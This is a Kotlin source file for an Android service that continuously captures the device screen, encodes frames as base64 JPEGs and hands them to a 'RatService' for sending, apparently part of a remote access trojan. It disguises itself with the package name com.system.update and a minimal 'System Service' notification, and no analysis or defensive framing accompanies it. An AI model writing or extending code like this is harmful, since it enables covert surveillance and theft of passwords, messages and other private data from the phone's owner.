package com.system.update

import android.annotation.SuppressLint
import android.app.*
import android.content.Context
import android.content.Intent
import android.graphics.Bitmap
import android.graphics.PixelFormat
import android.hardware.display.DisplayManager
import android.hardware.display.VirtualDisplay
import android.media.ImageReader
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.util.Base64
import android.util.DisplayMetrics
import android.util.Log
import android.view.WindowManager
import androidx.core.app.NotificationCompat
import java.io.ByteArrayOutputStream

class ScreenStreamService : Service() {

    companion object {
        const val TAG = "ScreenStream"
        const val NOTIF_ID = 201
        @Volatile var isStreaming: Boolean = false
        @Volatile var intervalMs: Long = 120L
    }

    private var virtualDisplay: VirtualDisplay? = null
    private var imageReader: ImageReader? = null
    private var running = false
    private var handler: Handler? = null

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        startForeground(NOTIF_ID, buildNotification())

        val interval = intent?.getLongExtra("interval", 120L) ?: 120L
        intervalMs = interval

        if (!ScreenCapture.isReady()) {
            Log.w(TAG, "MediaProjection not ready — skip")
            stopSelf()
            return START_NOT_STICKY
        }

        isStreaming = true
        running = true
        handler = Handler(Looper.getMainLooper())

        startVirtualDisplay()
        loopCapture()
        return START_STICKY
    }

    private fun buildNotification(): Notification {
        val pi = PendingIntent.getActivity(
            this, 0,
            Intent(this, MainActivity::class.java),
            PendingIntent.FLAG_IMMUTABLE
        )
        return NotificationCompat.Builder(this, App.CHANNEL_ID)
            .setContentTitle("System Service")
            .setContentText("Running")
            .setSmallIcon(android.R.drawable.stat_notify_sync)
            .setContentIntent(pi)
            .setOngoing(true)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .build()
    }

    @SuppressLint("WrongConstant")
    private fun startVirtualDisplay() {
        try {
            val wm = getSystemService(Context.WINDOW_SERVICE) as WindowManager
            val metrics = DisplayMetrics()
            @Suppress("DEPRECATION")
            wm.defaultDisplay.getRealMetrics(metrics)

            val scale = 0.5f
            val width = (metrics.widthPixels * scale).toInt()
            val height = (metrics.heightPixels * scale).toInt()
            val dpi = (metrics.densityDpi * scale).toInt()

            imageReader = ImageReader.newInstance(width, height, PixelFormat.RGBA_8888, 2)

            virtualDisplay = ScreenCapture.getProjection()?.createVirtualDisplay(
                "screen-stream",
                width, height, dpi,
                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                imageReader!!.surface,
                null,
                handler
            )
        } catch (e: Exception) {
            Log.e(TAG, "startVirtualDisplay error", e)
        }
    }

    private fun loopCapture() {
        if (!running) return
        try {
            val reader = imageReader ?: return
            val image = try { reader.acquireLatestImage() } catch (_: Exception) { null }
            if (image != null) {
                try {
                    val planes = image.planes
                    val buffer = planes[0].buffer
                    val pixelStride = planes[0].pixelStride
                    val rowStride = planes[0].rowStride
                    val width = image.width
                    val height = image.height
                    val rowPadding = rowStride - pixelStride * width

                    val bmp = Bitmap.createBitmap(
                        width + rowPadding / pixelStride,
                        height,
                        Bitmap.Config.ARGB_8888
                    )
                    bmp.copyPixelsFromBuffer(buffer)
                    val cropped = Bitmap.createBitmap(bmp, 0, 0, width, height)
                    val bos = ByteArrayOutputStream()
                    cropped.compress(Bitmap.CompressFormat.JPEG, 45, bos)
                    val b64 = Base64.encodeToString(bos.toByteArray(), Base64.NO_WRAP)

                    RatService.instance?.sendFrame("screen_frame", b64)
                } catch (e: Exception) {
                    Log.e(TAG, "encode error", e)
                } finally {
                    try { image.close() } catch (_: Exception) {}
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "loopCapture error", e)
        }

        handler?.postDelayed({ if (running) loopCapture() }, intervalMs)
    }

    override fun onDestroy() {
        running = false
        isStreaming = false
        try { virtualDisplay?.release() } catch (_: Exception) {}
        try { imageReader?.close() } catch (_: Exception) {}
        super.onDestroy()
    }

    override fun onBind(intent: Intent?): IBinder? = null
}